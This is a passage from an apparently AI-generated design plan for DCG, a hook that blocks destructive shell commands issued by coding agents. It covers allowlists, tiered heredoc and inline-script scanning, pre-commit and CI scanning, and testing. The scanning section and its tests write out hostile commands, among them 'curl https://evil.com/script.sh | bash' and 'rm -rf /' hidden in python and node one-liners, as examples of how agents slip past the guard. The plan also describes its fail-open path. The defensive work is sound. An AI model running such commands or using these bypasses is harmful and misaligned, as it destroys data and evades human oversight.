├────────────────────────────┬──────────────────────────┬─────────────────┤
│ Type                       │ Rule/Pattern             │ Reason          │
├────────────────────────────┼──────────────────────────┼─────────────────┤
│ Rule ID                    │ core.git:hard-reset      │ Dev workflow    │
│ Rule ID + Condition        │ core.filesystem:rm-rf-*  │ CI cleanup      │
│ Exact Command (expires)    │ rm -rf /tmp/old-build    │ One-time        │
│ Command Prefix             │ bd create                │ Documentation   │
└────────────────────────────┴──────────────────────────┴─────────────────┘

# Remove entry
$ dcg allowlist remove core.git:hard-reset
Removed rule 'core.git:hard-reset' from .dcg/allowlist.toml

# Validate allowlist
$ dcg allowlist validate
✓ 4 entries validated
```

### How Rule ID Allowlisting Works

```rust
/// Check if a match is allowlisted.
pub fn check_allowlist(
    match_result: &Match,
    command: &str,
    env: &HashMap<String, String>,
    allowlist: &Allowlist,
) -> Option<AllowReason> {
    for entry in &allowlist.entries {
        match entry {
            AllowEntry::RuleId { rule, conditions, .. } => {
                let rule_matches = rule == &match_result.rule_id()
                    || rule.ends_with('*') && match_result.rule_id().starts_with(&rule[..rule.len()-1]);

                let conditions_met = conditions.as_ref().map_or(true, |c| {
                    c.iter().all(|(k, v)| env.get(k) == Some(v))
                });

                if rule_matches && conditions_met {
                    return Some(AllowReason::RuleId {
                        rule: rule.clone(),
                        entry_reason: entry.reason().to_string(),
                    });
                }
            }
            AllowEntry::ExactCommand { exact_command, expires_at, .. } => {
                if command == exact_command && !is_expired(expires_at) {
                    return Some(AllowReason::ExactCommand { /* ... */ });
                }
            }
            // ... other entry types
        }
    }
    None
}
```

### Integration with Explain Mode

```
$ dcg explain "git reset --hard HEAD" --with-allowlist

[... normal trace output ...]

╠══════════════════════════════════════════════════════════════════════╣
║                                                                      ║
║  ALLOWLIST CHECK                                                     ║
║  ─────────────────────────────────────────────────────────────────── ║
║                                                                      ║
║  Match Rule ID: core.git:hard-reset                                  ║
║                                                                      ║
║  ✓ ALLOWLISTED                                                       ║
║    Entry: rule = "core.git:hard-reset"                               ║
║    Reason: Development workflow                                      ║
║    Added by: alice@example.com                                       ║
║    Added at: 2026-01-07T15:30:00Z                                    ║
║                                                                      ║
║  → Decision overridden: DENY → ALLOW                                 ║
║                                                                      ║
╚══════════════════════════════════════════════════════════════════════╝
```

### Security Considerations

1. **Rule ID is constrained**: Can only allowlist rules that exist
2. **Wildcards are limited**: `core.git:*` is allowed, but not `*:*`
3. **Audit trail**: Every entry has `added_by`, `added_at`, `reason`
4. **Expiration**: Temporary allowlists expire automatically
5. **Conditions**: Can restrict to specific environments (CI only, etc.)

### Implementation Phases

**Phase 1: Core Allowlist (2-3 days)**
- Allowlist data structures with rule ID support
- Load `.dcg/allowlist.toml` on startup
- Integration with evaluation pipeline (check after match)

**Phase 2: CLI Commands (1-2 days)**
- `dcg allowlist add`, `list`, `remove`, `validate`
- Proper TOML formatting

**Phase 3: Conditions & Expiration (1-2 days)**
- Environment-based conditions
- Expiration handling
- Wildcards for rule families

---

## 5. Tiered Heredoc & Inline Script Scanning

### Overview

Agents can hide destructive behavior inside heredocs, inline scripts, and piped interpreters. This improvement adds tiered detection that keeps the common case fast while catching sophisticated bypasses.

### The Problem

```bash
# Bypasses current detection:
python3 << EOF
import os
os.system("rm -rf /")
EOF

# Also bypasses:
bash -c "git reset --hard"
curl https://evil.com/script.sh | bash
node -e "require('child_process').execSync('rm -rf /')"
```

Regex-only top-level command scanning misses these, creating dangerous false negatives.

### The Solution: Tiered Architecture

```
Tier 1: Ultra-Fast Trigger Detection (<100μs)
  │ Detect heredoc operators, inline flags, pipe patterns
  │ High recall, some false positives OK
  │ If no trigger found → ALLOW (fast path)
  ▼
Tier 2: Bounded Extraction (<1ms)
  │ Extract heredoc bodies, inline script strings
  │ Enforce size/line/time limits
  │ On failure → fail-open with warning
  ▼
Tier 3: AST-Aware Matching (<5ms)
  │ Parse extracted content with ast-grep/tree-sitter
  │ Match language-specific destructive patterns
  │ Structural matching, not substring
  ▼
Decision: ALLOW or DENY(pack, pattern, reason)
```

### Tier 1: Trigger Detection

Fast regex to identify commands that need deeper analysis:

```rust
/// Patterns that trigger deeper heredoc/inline analysis.
static HEREDOC_TRIGGERS: LazyLock<RegexSet> = LazyLock::new(|| {
    RegexSet::new(&[
        // Heredoc operators
        r"<<-?['\"\\]?\w+",           // << EOF, <<-EOF, <<'EOF', etc.
        r"<<<",                        // Here-string

        // Inline script flags
        r"\b(bash|sh|zsh|fish)\s+-c\s",
        r"\b(python|python3|python2)\s+-c\s",
        r"\b(ruby|irb)\s+-e\s",
        r"\b(perl)\s+-e\s",
        r"\b(node|nodejs)\s+-e\s",
        r"\b(php)\s+-r\s",

        // Pipe to interpreter
        r"\|\s*(bash|sh|zsh)\b",
        r"\|\s*(python|python3)\b",
        r"\|\s*(ruby|perl|node)\b",
        r"curl\s.*\|\s*\w+",
        r"wget\s.*\|\s*\w+",
    ]).unwrap()
});

/// Quick check for heredoc/inline script patterns.
pub fn needs_deep_analysis(command: &str) -> bool {
    HEREDOC_TRIGGERS.is_match(command)
}
```

### Tier 2: Bounded Extraction

Extract content with strict limits:

```rust
/// Limits for heredoc extraction.
pub const HEREDOC_LIMITS: ExtractionLimits = ExtractionLimits {
    max_body_bytes: 1_048_576,  // 1MB
    max_body_lines: 10_000,
    max_heredocs: 10,           // Per command
    timeout_ms: 50,             // Hard timeout
};

/// Result of heredoc extraction.
#[derive(Debug)]
pub struct HeredocContent {
    pub delimiter: String,
    pub body: String,
    pub language_hint: Option<Language>,
    pub is_quoted: bool,        // <<'EOF' vs <<EOF
    pub strip_tabs: bool,       // <<- vs <<
}

/// Extract heredoc bodies from a command.
pub fn extract_heredocs(
    command: &str,
    limits: &ExtractionLimits,
) -> Result<Vec<HeredocContent>, ExtractionError> {
    // Early size check
    if command.len() > limits.max_body_bytes {
        return Err(ExtractionError::TooLarge);
    }

    let start = Instant::now();
    let mut heredocs = Vec::new();

    for heredoc_match in find_heredoc_operators(command) {
        if start.elapsed().as_millis() > limits.timeout_ms as u128 {
            tracing::warn!("Heredoc extraction timeout, failing open");
            return Err(ExtractionError::Timeout);
        }

        if heredocs.len() >= limits.max_heredocs {
            tracing::warn!("Too many heredocs, stopping extraction");
            break;
        }

        if let Some(content) = extract_single_heredoc(command, &heredoc_match, limits)? {
            heredocs.push(content);
        }
    }

    Ok(heredocs)
}

/// Extract inline script content (bash -c "...", python -c "...", etc.)
pub fn extract_inline_scripts(command: &str) -> Vec<InlineScript> {
    let mut scripts = Vec::new();

    for pattern in INLINE_SCRIPT_PATTERNS {
        for cap in pattern.captures_iter(command) {
            if let Some(script_content) = cap.get(1) {
                scripts.push(InlineScript {
                    interpreter: extract_interpreter(&cap),
                    content: unescape_string(script_content.as_str()),
                    language: infer_language(&cap),
                });
            }
        }
    }

    scripts
}
```

### Tier 3: AST-Aware Matching

Use ast-grep-core for structural pattern matching:

```rust
/// AST patterns for detecting destructive code by language.
static AST_PATTERNS: LazyLock<HashMap<Language, Vec<AstPattern>>> = LazyLock::new(|| {
    hashmap! {
        Language::Python => vec![
            AstPattern::new("os.system($CMD)", "Shell execution via os.system"),
            AstPattern::new("subprocess.run($$$, shell=True)", "Shell execution via subprocess"),
            AstPattern::new("subprocess.call($$$, shell=True)", "Shell execution via subprocess"),
            AstPattern::new("shutil.rmtree($PATH)", "Recursive directory deletion"),
            AstPattern::new("os.remove($PATH)", "File deletion"),
            AstPattern::new("os.unlink($PATH)", "File deletion"),
            AstPattern::new("exec($CODE)", "Dynamic code execution"),
            AstPattern::new("eval($CODE)", "Dynamic code evaluation"),
        ],
        Language::JavaScript => vec![
            AstPattern::new("child_process.exec($CMD)", "Shell execution"),
            AstPattern::new("child_process.execSync($CMD)", "Shell execution"),
            AstPattern::new("child_process.spawn($CMD, $$$)", "Process spawn"),
            AstPattern::new("fs.rmSync($PATH, $$$)", "Recursive deletion"),
            AstPattern::new("fs.rmdirSync($PATH, $$$)", "Directory deletion"),
            AstPattern::new("eval($CODE)", "Dynamic code evaluation"),
        ],
        Language::Ruby => vec![
            AstPattern::new("system($CMD)", "Shell execution"),
            AstPattern::new("`$CMD`", "Shell execution via backticks"),
            AstPattern::new("exec($CMD)", "Shell execution"),
            AstPattern::new("FileUtils.rm_rf($PATH)", "Recursive deletion"),
            AstPattern::new("eval($CODE)", "Dynamic code evaluation"),
        ],
        Language::Bash => vec![
            AstPattern::new("rm -rf $PATH", "Recursive force deletion"),
            AstPattern::new("git reset --hard", "Hard reset"),
            AstPattern::new("git push --force", "Force push"),
            AstPattern::new("dd if=$SRC of=$DST", "Low-level disk write"),
        ],
    }
});

/// Match AST patterns against extracted content.
pub fn match_ast_patterns(
    content: &str,
    language: Language,
) -> Result<Vec<AstMatch>, AstError> {
    let patterns = AST_PATTERNS.get(&language).ok_or(AstError::UnsupportedLanguage)?;

    // Parse content with tree-sitter
    let tree = parse_content(content, language)?;

    let mut matches = Vec::new();
    for pattern in patterns {
        for node_match in pattern.find_matches(&tree) {
            matches.push(AstMatch {
                pattern_name: pattern.name.to_string(),
                reason: pattern.reason.to_string(),
                matched_text: node_match.text().to_string(),
                line: node_match.start_position().row + 1,
            });
        }
    }

    Ok(matches)
}
```

### Language Detection

```rust
/// Infer language from context.
pub fn detect_heredoc_language(
    command: &str,
    heredoc: &HeredocContent,
) -> Language {
    // 1. Check interpreter prefix
    if command.starts_with("python") { return Language::Python; }
    if command.starts_with("ruby") { return Language::Ruby; }
    if command.starts_with("node") { return Language::JavaScript; }

    // 2. Check delimiter hints
    let delim = heredoc.delimiter.to_uppercase();
    if delim.contains("PY") || delim == "PYTHON" { return Language::Python; }
    if delim.contains("JS") || delim == "JAVASCRIPT" { return Language::JavaScript; }
    if delim.contains("RB") || delim == "RUBY" { return Language::Ruby; }

    // 3. Check shebang
    if heredoc.body.starts_with("#!/usr/bin/env python") { return Language::Python; }
    if heredoc.body.starts_with("#!/usr/bin/python") { return Language::Python; }
    if heredoc.body.starts_with("#!/bin/bash") { return Language::Bash; }

    // 4. Content heuristics
    if heredoc.body.contains("import os") || heredoc.body.contains("def ") { return Language::Python; }
    if heredoc.body.contains("require(") || heredoc.body.contains("const ") { return Language::JavaScript; }

    // 5. Default to bash for shell-like content
    Language::Bash
}
```

### Fail-Open Semantics

```rust
/// Analyze heredoc with graceful failure handling.
pub fn analyze_heredoc_safe(
    content: &HeredocContent,
    config: &Config,
) -> Decision {
    match analyze_heredoc_internal(content, config) {
        Ok(decision) => decision,
        Err(e) => {
            // Log error but fail-open
            tracing::warn!(
                "Heredoc analysis failed, allowing command: {:?}",
                e
            );
            Decision::Allow {
                reason: "Heredoc analysis failed (fail-open)".to_string(),
            }
        }
    }
}
```

### Tests Required

```rust
#[test]
fn test_heredoc_detection_python() {
    let cmd = r#"python3 << EOF
import os
os.system("rm -rf /")
EOF"#;

    let decision = evaluate_command(cmd, &Config::default(), None);
    assert!(matches!(decision, Decision::Deny { .. }));
}

#[test]
fn test_inline_script_detection() {
    let commands = vec![
        r#"bash -c "rm -rf /""#,
        r#"python -c "import os; os.system('rm -rf /')""#,
        r#"node -e "require('child_process').execSync('rm -rf /')""#,
    ];

    for cmd in commands {
        let decision = evaluate_command(cmd, &Config::default(), None);
        assert!(matches!(decision, Decision::Deny { .. }), "Should block: {}", cmd);
    }
}

#[test]
fn test_heredoc_timeout() {
    // Construct a command that would cause slow parsing
    let huge_heredoc = format!("cat << EOF\n{}\nEOF", "x".repeat(10_000_000));

    let start = Instant::now();
    let decision = evaluate_command(&huge_heredoc, &Config::default(), None);
    let elapsed = start.elapsed();

    // Should fail-open within timeout
    assert!(elapsed.as_millis() < 100);
    assert!(matches!(decision, Decision::Allow { .. }));
}
```

### Implementation Phases

**Phase 1: Tier 1 Triggers (1-2 days)**
- Implement `needs_deep_analysis()` with RegexSet
- Add to evaluation pipeline as early check
- Benchmark to ensure <100μs

**Phase 2: Tier 2 Extraction (2-3 days)**
- Heredoc body extraction with limits
- Inline script extraction
- Timeout handling and fail-open

**Phase 3: Language Detection (1-2 days)**
- Interpreter prefix detection
- Delimiter hints
- Shebang parsing
- Content heuristics

**Phase 4: Tier 3 AST Matching (3-5 days)**
- Integrate ast-grep-core
- Define patterns for Python, JavaScript, Ruby, Bash
- Structural matching implementation

---

## 6. Pre-Commit Hook & GitHub Action

### Overview

Extend DCG protection beyond Claude Code to the entire development workflow:
- **Pre-commit hook**: Scan files before commit
- **GitHub Action**: Scan PRs before merge

### Pre-Commit Hook

```bash
$ dcg install-hook

✓ Installed pre-commit hook at .git/hooks/pre-commit
✓ Created configuration at .dcg/hooks.toml

Configuration:
  Scan patterns: *.sh, *.bash, Makefile, *.yml, *.yaml, Dockerfile*
  Check commit messages: true
  Fail on: error (warnings are advisory)
```

When committing:

```bash
$ git commit -m "Add deployment script"

┌─────────────────────────────────────────────────────────────────┐
│  DCG Pre-Commit Scan                                            │
├─────────────────────────────────────────────────────────────────┤
│                                                                 │
│  Scanning 3 staged files...                                     │
│                                                                 │
│  scripts/deploy.sh                                              │
│  ├─ Line 15: rm -rf ${DEPLOY_DIR}/*                             │
│  │  ├─ Rule: core.filesystem:rm-rf-variable                     │
│  │  ├─ Risk: Unvalidated variable in recursive deletion         │
│  │  └─ Suggestion: Validate DEPLOY_DIR before deletion          │
│  │                                                              │
│  ├─ Line 28: git reset --hard origin/main                       │
│  │  ├─ Rule: core.git:hard-reset                                │
│  │  ├─ Risk: Can permanently lose local commits                 │
│  │  └─ Suggestion: Use git fetch && git checkout instead        │
│  │                                                              │
│  └─ 2 issues found (1 error, 1 warning)                         │
│                                                                 │
│  .github/workflows/deploy.yml: OK                               │
│  Makefile: OK                                                   │
│                                                                 │
├─────────────────────────────────────────────────────────────────┤
│  Summary: 1 error, 1 warning in 3 files                         │
│  ✗ Commit blocked due to errors.                                │
│                                                                 │
│  To fix:                                                        │
│    1. Address the issues above, or                              │
│    2. dcg allowlist add <rule> --reason "..."                   │
│                                                                 │
│  To bypass (not recommended):                                   │
│    git commit --no-verify                                       │
└─────────────────────────────────────────────────────────────────┘
```

### GitHub Action

```yaml
# .github/workflows/dcg.yml
name: DCG Security Scan

on:
  pull_request:
    branches: [main]

jobs:
  scan:
    runs-on: ubuntu-latest
    permissions:
      contents: read
      pull-requests: write

    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0

      - name: DCG Security Scan
        uses: anthropics/dcg-action@v1
        with:
          fail_on: error
          scan_paths: |
            **/*.sh
            **/*.bash
            **/Makefile
            **/*.yml
            **/*.yaml
            **/Dockerfile*
          comment_on_pr: true
          github_token: ${{ secrets.GITHUB_TOKEN }}
```

PR comment when issues found:

```markdown
## 🛡️ DCG Security Scan Results

**2 issues found** in this pull request.

### ❌ Errors (blocking)

<details>
<summary><code>scripts/deploy.sh</code> - 1 error</summary>

**Line 45:** `rm -rf ${DEPLOY_DIR}/*`

| | |
|---|---|
| **Rule** | `core.filesystem:rm-rf-variable` |
| **Risk** | Unvalidated variable in recursive deletion |
| **Suggestion** | Validate `DEPLOY_DIR` before deletion |

</details>

### ⚠️ Warnings (advisory)

<details>
<summary><code>.github/workflows/cleanup.yml</code> - 1 warning</summary>

**Line 23:** `docker system prune -af`

| | |
|---|---|
| **Rule** | `containers.docker:system-prune-force` |
| **Risk** | Removes all unused resources without confirmation |

</details>

---
*Scanned by [DCG](https://github.com/anthropics/dcg) v0.2.0*
```

### Implementation Phases

**Phase 1: Pre-Commit Scanner (3-4 days)**
- File scanning with language detection
- `dcg scan --staged` command
- Hook installation

**Phase 2: GitHub Action (3-4 days)**
- Docker container with DCG binary
- PR comment posting
- Check status integration

---

## 7. Test Infrastructure & Performance Guardrails

### Overview

Security tools must be reliable and fast. This improvement ensures DCG never hangs, never crashes, and stays performant as features grow.

### Property-Based Testing

```rust
proptest! {
    /// Normalization is idempotent.
    #[test]
    fn normalization_idempotent(cmd in ".*") {
        let once = normalize_command(&cmd);
        let twice = normalize_command(&once);
        prop_assert_eq!(once, twice);
    }

    /// No command causes a panic.
    #[test]
    fn no_panics(cmd in ".*") {
        let _ = std::panic::catch_unwind(|| {
            evaluate_command(&cmd, &Config::default(), None)
        });
    }

    /// Decisions are deterministic.
    #[test]
    fn deterministic(cmd in ".*") {
        let r1 = evaluate_command(&cmd, &Config::default(), None);
        let r2 = evaluate_command(&cmd, &Config::default(), None);
        prop_assert_eq!(std::mem::discriminant(&r1), std::mem::discriminant(&r2));
    }
}
```

### Fuzzing Targets

```rust
// fuzz/fuzz_targets/evaluate.rs
fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = evaluate_command(s, &Config::default(), None);
    }
});

// fuzz/fuzz_targets/heredoc.rs
fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = extract_heredocs(s, &HEREDOC_LIMITS);
    }
});

// fuzz/fuzz_targets/tokenizer.rs
fuzz_target!(|data: &[u8]| {
    if let Ok(s) = std::str::from_utf8(data) {
        let _ = tokenize_command(s);
    }
});
```

### Performance Budgets

```rust
/// Performance budget for command evaluation.
pub const PERFORMANCE_BUDGET: PerformanceBudget = PerformanceBudget {
    // Fast path (no heredocs, no inline scripts)
    quick_reject_max_us: 10,
    normalization_max_us: 5,
    safe_pattern_check_max_us: 100,
    destructive_pattern_check_max_us: 200,
    total_fast_path_max_us: 500,

    // Slow path (heredocs, inline scripts)
    heredoc_extraction_max_ms: 5,
    ast_parsing_max_ms: 10,
    total_slow_path_max_ms: 20,

    // Hard caps (fail-open beyond these)
    absolute_max_ms: 50,
    max_command_length: 1_048_576,  // 1MB
};
```

### CI Integration

```yaml
# .github/workflows/test.yml
name: Test Suite

on: [push, pull_request]

jobs:
  unit-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo test --all-features

  property-tests:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo test proptest -- --ignored

  fuzzing:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@nightly
      - run: cargo install cargo-fuzz
      - run: cargo +nightly fuzz run evaluate -- -max_total_time=300
      - run: cargo +nightly fuzz run heredoc -- -max_total_time=300

  benchmarks:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: dtolnay/rust-toolchain@stable
      - run: cargo bench --bench performance
      - name: Check performance budget
        run: |
          # Fail if any benchmark exceeds budget
          cargo bench --bench performance -- --save-baseline current
          cargo bench --bench performance -- --compare baseline current
```

---

## Comprehensive Ideas Analysis (30 Ideas)

Below are all 30 ideas considered, with analysis of each.

| # | Idea | Impact | Effort | Selected |
|---|------|--------|--------|----------|
| 1 | Pack-aware global quick reject | Critical | Low | ✓ #1 |
| 2 | Deterministic pack ordering | Critical | Low | ✓ #1 |
| 3 | Stable match identity (pack_id + pattern_name) | High | Low | ✓ #1 |
| 4 | Shared evaluator (hook = CLI) | Critical | Medium | ✓ #1 |
| 5 | Precompile override regex | Medium | Low | ✓ #1 |
| 6 | Execution-context classification | Critical | High | ✓ #2 |
| 7 | Safe string-argument registry | High | Low | ✓ #2 |
| 8 | Token-aware keyword gating | Medium | Medium | Merged into #2 |
| 9 | Normalize wrappers (sudo/env) | Medium | Low | ✓ Integrated |
| 10 | Decision modes (deny/warn/log) | Medium | Medium | ✓ Integrated |
| 11 | Structured logging + redaction | Medium | Medium | ✓ Integrated |
| 12 | `dcg explain` trace output | High | Medium | ✓ #3 |
| 13 | Allowlist by rule ID | High | Medium | ✓ #4 |
| 14 | Simulation mode (dry run on logs) | Medium | Low | Appendix |
| 15 | Observe mode (warn-only rollout) | Medium | Low | ✓ Integrated |
| 16 | Prefer linear-time regex | Medium | Medium | ✓ #7 |
| 17 | Size/time limits (DoS protection) | Critical | Low | ✓ #5, #7 |
| 18 | E2E tests for non-core packs | High | Medium | ✓ #7 |
| 19 | Golden parity tests (hook = CLI) | High | Low | ✓ #1 |
| 20 | Pack keyword audit tests | Medium | Low | ✓ #7 |
| 21 | Per-rule suggestions | Medium | Medium | ✓ #3 |
| 22 | Improved `dcg doctor` | Medium | Low | ✓ Integrated |
| 23 | Config discovery optimizations | Low | Low | Appendix |
| 24 | Safe cleanup pack (rm -rf target/) | Medium | Medium | Appendix |
| 25 | Rule severity taxonomy | Medium | Low | ✓ Integrated |
| 26 | Confidence scoring | Medium | High | Appendix |
| 27 | Tiered heredoc scanning | High | High | ✓ #5 |
| 28 | Language detection heuristics | Medium | Medium | ✓ #5 |
| 29 | Fuzz/property testing | High | Medium | ✓ #7 |
| 30 | Performance benchmarks in CI | High | Medium | ✓ #7 |

---

## Implementation Roadmap

### Phase 1: Core Correctness (Week 1-2)

**Goal**: Fix the foundation before building features.

| Task | Effort | Priority |
|------|--------|----------|
| Pack-aware quick reject | 2 days | P0 |
| Deterministic pack ordering | 1 day | P0 |
| Stable match identity | 1 day | P0 |
| Shared evaluator | 2 days | P0 |
| Precompile overrides | 1 day | P1 |
| Parity tests | 2 days | P0 |

**Deliverable**: Enabled packs work, decisions are deterministic, test matches reality.

### Phase 2: False Positive Immunity (Week 3-4)

**Goal**: Eliminate the most frustrating false positives.

| Task | Effort | Priority |
|------|--------|----------|
| Safe string-arg registry | 2 days | P0 |
| Minimal tokenizer | 4 days | P1 |
| Integration + testing | 2 days | P1 |

**Deliverable**: Documentation commands work (`bd create`, `git commit -m`, `grep`).

### Phase 3: Explainability (Week 5-6)

**Goal**: Users can understand and debug decisions.

| Task | Effort | Priority |
|------|--------|----------|
| Explain trace infrastructure | 2 days | P1 |
| Context analysis display | 2 days | P1 |
| Allowlist by rule ID | 3 days | P1 |
| Suggestions database | 2 days | P2 |

**Deliverable**: `dcg explain` works, allowlisting is safe and simple.

### Phase 4: Deep Scanning (Week 7-8)

**Goal**: Catch sophisticated bypasses.

| Task | Effort | Priority |
|------|--------|----------|
| Tier 1 triggers | 1 day | P1 |
| Tier 2 extraction | 3 days | P1 |
| Language detection | 2 days | P2 |
| Tier 3 AST matching | 4 days | P2 |

**Deliverable**: Heredocs and inline scripts are analyzed.

### Phase 5: Team Protection (Week 9-10)

**Goal**: Extend protection to entire workflow.

| Task | Effort | Priority |
|------|--------|----------|
| Pre-commit scanner | 3 days | P2 |
| Hook installation | 2 days | P2 |
| GitHub Action | 4 days | P2 |

**Deliverable**: Pre-commit and CI/CD protection.

### Phase 6: Hardening (Ongoing)

**Goal**: Ensure long-term reliability.

| Task | Effort | Priority |
|------|--------|----------|
| Property-based tests | 2 days | P1 |
| Fuzzing setup | 2 days | P1 |
| Performance benchmarks | 2 days | P2 |
| CI integration | 1 day | P2 |

**Deliverable**: No panics, no hangs, performance budgets enforced.

---

## Success Metrics

### Correctness Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Pack reachability | 100% | All enabled packs evaluated in E2E tests |
| Decision determinism | 100% | Same result on 1000 repeated runs |
| Hook/CLI parity | 100% | Parity test suite passes |

### User Experience Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| False positive rate | <2% | User reports, telemetry |
| Time to understand block | <30s | User testing with explain mode |
| Time to resolve false positive | <2min | User testing with allowlist |

### Reliability Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Crash rate | 0% | Fuzzing, production monitoring |
| Timeout rate | <0.1% | Telemetry |
| P99 latency (fast path) | <500μs | Benchmarks |
| P99 latency (heredoc path) | <20ms | Benchmarks |

### Adoption Metrics

| Metric | Target | Measurement |
|--------|--------|-------------|
| Users with allowlist | 30% | File detection |
| Pre-commit hook installs | 20% | Tracking |
| GitHub Action usage | 1000+ repos | Marketplace |

---

## Conclusion

The seven improvements outlined in this document form a coherent, dependency-ordered strategy:

1. **Core Correctness** — Fix the foundation (pack reachability, determinism)
2. **False Positive Immunity** — Eliminate the trust-destroying interruptions
3. **Explain Mode** — Make decisions transparent and debuggable
4. **Allowlisting by Rule ID** — Safe, auditable customization
5. **Tiered Heredoc Scanning** — Catch sophisticated bypasses
6. **Team Protection** — Extend to pre-commit and CI/CD
7. **Reliability Guardrails** — Ensure long-term sustainability

Together, these transform DCG from "a hook that sometimes blocks things" into "a trusted security layer that is obviously correct, rarely annoying, and always enabled."

---

*Document generated by Claude Opus 4.5 on 2026-01-08 (Enhanced Hybrid Version)*
